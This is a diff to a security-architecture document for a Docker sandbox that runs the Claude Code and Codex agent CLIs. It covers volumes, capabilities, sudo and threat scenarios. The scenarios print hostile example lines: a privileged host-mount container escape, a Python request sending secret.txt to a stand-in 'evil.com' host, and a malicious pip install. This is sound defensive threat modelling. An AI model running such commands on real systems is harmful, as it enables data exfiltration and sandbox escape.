@@ -1,6 +1,7 @@
-# Security Architecture - sclaude
+# Security Architecture - sclaude / scodex
 
-Comprehensive security analysis of sclaude's Docker sandbox for running Claude Code with persistent configuration.
+Security analysis of the shared Docker sandbox for running Claude Code through
+`sclaude` or Codex through `scodex`.
 
 ## Threat Model
 
@@ -44,10 +45,12 @@ Comprehensive security analysis of sclaude's Docker sandbox for running Claude C
 #### Docker Volumes for Persistence
 ```bash
 -v sclaude-config:/sclaude-config:rw \
--v sclaude-rootfs:/home/claude:rw \
--v sclaude-npm:/home/claude/.npm-global:rw \
--v sclaude-pip:/home/claude/.local:rw \
--v sclaude-apt:/var/cache/apt:rw
+-v scodex-config:/scodex-config:rw \
+-v sagent-rootfs:/home/agent:rw \
+-v sagent-npm:/home/agent/.npm-global:rw \
+-v sagent-pip:/home/agent/.local:rw \
+-v sagent-apt-cache:/var/cache/apt:rw \
+-v sagent-apt-lists:/var/lib/apt/lists:rw
 ```
 
 **Protection**:
@@ -67,10 +70,9 @@ Comprehensive security analysis of sclaude's Docker sandbox for running Claude C
 ```dockerfile
 ARG USER_UID=1000
 ARG USER_GID=1000
-RUN groupadd -f -g ${USER_GID} claude && \
-    useradd -o -u ${USER_UID} -g claude -m -s /bin/bash claude
+RUN ... useradd -o -u ${USER_UID} ... agent
 
-USER claude
+USER agent
 ```
 
 **Protection**:
@@ -80,58 +82,63 @@ USER claude
 **Prevents**:
 - ✅ Modifying system configuration
 - ✅ Accessing privileged operations
-- ✅ Installing system-level malware
+- ✅ Installing system-level packages without the allowlisted sudo path
 
 #### Sudo Configuration
 ```dockerfile
-RUN echo 'claude ALL=(root) NOPASSWD: /usr/bin/apt-get, /usr/bin/apt, /usr/bin/dpkg' >> /etc/sudoers.d/claude
+RUN echo 'agent ALL=(root) NOPASSWD: /usr/bin/apt-get, /usr/bin/apt, /usr/bin/dpkg' > /etc/sudoers.d/agent
 ```
 
 **Limited Sudo**:
 - Only for apt/dpkg commands
 - No password required (for convenience)
-- Packages ephemeral (lost on container restart)
+- Package installs are supported for agent workflows
 
 **Rationale**:
-- Allows Claude to install packages temporarily
-- Container is ephemeral (--rm flag), changes don't persist
-- Still cannot modify system outside container
+- Allows agent CLIs to install system dependencies while working
+- Package manager cache/list directories persist in Docker volumes
+- Root is inside the container only; host isolation still depends on Docker
 
-### Layer 3: Capability Dropping
+### Layer 3: Capability Limiting
 
 ```bash
 --cap-drop=ALL \
+--cap-add=CHOWN \
+--cap-add=DAC_OVERRIDE \
+--cap-add=FOWNER \
+--cap-add=FSETID \
+--cap-add=SETGID \
+--cap-add=SETUID \
+--cap-add=SYS_CHROOT \
 --cap-add=NET_BIND_SERVICE
 ```
 
 **Protection**:
-- Removes all Linux capabilities
-- Only adds back NET_BIND_SERVICE (bind ports <1024)
+- Starts with no Linux capabilities
+- Adds back only the set needed for allowlisted `sudo apt` package installs and
+  low-port binding
 
 **Prevents**:
 - ✅ `CAP_SYS_ADMIN` - Cannot mount filesystems or create namespaces
 - ✅ `CAP_SYS_PTRACE` - Cannot debug other processes
 - ✅ `CAP_NET_ADMIN` - Cannot modify network configuration
 - ✅ `CAP_SYS_MODULE` - Cannot load kernel modules
-- ✅ `CAP_DAC_OVERRIDE` - Cannot bypass file permissions
 - ✅ `CAP_MKNOD` - Cannot create device files
 
-**Result**: Even if root is achieved, capabilities severely limit damage.
+**Result**: Root inside the container can manage packages, but broad
+container-control capabilities remain unavailable.
 
-### Layer 4: Security Options
+### Layer 4: Controlled In-Container Root
 
-```bash
---security-opt=no-new-privileges
-```
+The runtime intentionally does not use `no-new-privileges`, because that would
+break `sudo apt`. The tradeoff is explicit: agent CLIs can become root inside the
+container for allowlisted package-management commands.
 
-**Protection**:
-- Prevents gaining additional privileges via setuid/setgid
-- Blocks privilege escalation vectors
-
-**Prevents**:
-- ✅ Exploiting setuid binaries (sudo, ping, etc.)
-- ✅ Gaining capabilities via file capabilities
-- ✅ Escalating from claude user to root
+**Protection still provided**:
+- Docker socket is not mounted
+- Host filesystem access is limited to the workspace bind mount
+- Resource limits still apply
+- The capability set is restricted
 
 ### Layer 5: Resource Limits
 
@@ -169,16 +176,17 @@ RUN echo 'claude ALL=(root) NOPASSWD: /usr/bin/apt-get, /usr/bin/apt, /usr/bin/d
 
 **Protection**:
 - Isolated network namespace
-- Cannot access host network directly
+- Cannot use container `localhost` to access host loopback services
 
 **Prevents**:
 - ✅ Sniffing host traffic
-- ✅ Accessing host-only services (localhost:*)
 - ✅ Layer 2 attacks (ARP spoofing)
 
 **Allows**:
 - ✅ Internet access (for package downloads)
 - ✅ Outbound connections
+- ⚠️ Host services may still be reachable through Docker gateway addresses or
+  Docker Desktop host aliases depending on platform
 
 **Limitation**:
 - ⚠️ Can exfiltrate workspace data (inherent tradeoff for package management)
@@ -218,7 +226,7 @@ RUN echo 'claude ALL=(root) NOPASSWD: /usr/bin/apt-get, /usr/bin/apt, /usr/bin/d
 - ✅ Cannot build up cruft over time
 
 **What Persists** (by design):
-- Docker volumes (credentials, caches)
+- Docker volumes (credentials, tool config, caches)
 - Workspace files (the point of the tool)
 
 ## Attack Scenarios & Mitigations
@@ -248,18 +256,19 @@ docker run -v /:/host --privileged alpine chroot /host
 - Cannot access Docker daemon
 - Cannot create containers
 
-### Scenario 3: Privilege Escalation via Setuid
+### Scenario 3: Container Root via Sudo
 
 **Attack**:
 ```bash
-find / -perm -4000 2>/dev/null
-sudo su
+sudo apt-get install some-package
 ```
 
 **Mitigation**:
-- ✅ **BLOCKED**: no-new-privileges flag
-- Setuid bits ignored
-- All capabilities dropped
+- ⚠️ **ALLOWED FOR PACKAGE MANAGEMENT**: `apt`, `apt-get`, and `dpkg` are
+  allowlisted because agent CLIs may need system dependencies.
+- Docker socket remains unavailable.
+- Host filesystem access remains limited to the mounted workspace.
+- Capabilities remain limited to the package-management set.
 
 ### Scenario 4: Fork Bomb
 
@@ -298,7 +307,7 @@ requests.post('https://evil.com', files={'data': open('secret.txt')})
 **Mitigation**:
 - ⚠️ **PARTIALLY MITIGATED**:
   - Can exfiltrate workspace files (inherent tradeoff)
-  - Cannot access SSH keys or credentials outside workspace
+  - Cannot access SSH keys or credentials outside workspace, except auth/config files intentionally synced into `sclaude-config` or `scodex-config`
   - Network access needed for package management
 
 **Best Practices**:
@@ -362,7 +371,7 @@ pip install evil-package
 
 **Mitigations**:
 - Isolated in container
-- Cannot persist outside workspace
+- Package cache/list state can persist in Docker volumes
 - Review installed packages
 
 ## Security Checklist
@@ -370,7 +379,7 @@ pip install evil-package
 **Before running**:
 - [ ] Git commit - Save current state
 - [ ] No secrets in workspace
-- [ ] Native claude logged in (for OAuth sync)
+- [ ] Claude or Codex auth available if needed
 
 **After running**:
 - [ ] Review changes - `git diff`
@@ -411,12 +420,12 @@ PIDS_LIMIT="50"
 
 ## Comparison
 
-| Feature | sclaude | Native claude |
-|---------|---------|---------------|
+| Feature | sclaude / scodex | Native CLI |
+|---------|------------------|------------|
 | Filesystem | Workspace only | Full system |
 | Credentials | Docker volume | Keychain/file |
 | Path traversal | Blocked | Possible |
-| Privilege escalation | Blocked | Depends on OS |
+| In-container root | Allowed for package management | Depends on OS |
 | Resource limits | Enforced | None |
 | Network isolation | Bridge | Full access |
 | Container escape | Protected | N/A |
@@ -424,12 +433,13 @@ PIDS_LIMIT="50"
 
 ## Conclusion
 
-sclaude provides **strong isolation** while maintaining full functionality:
+sclaude and scodex provide **strong isolation** while maintaining agent CLI
+functionality:
 
 **Strong Protections**:
 - ✅ Path traversal blocked
 - ✅ Container escape prevented
-- ✅ Privilege escalation blocked
+- ✅ Host privilege escalation constrained by Docker isolation
 - ✅ Resource exhaustion prevented
 - ✅ Credentials persist securely
 
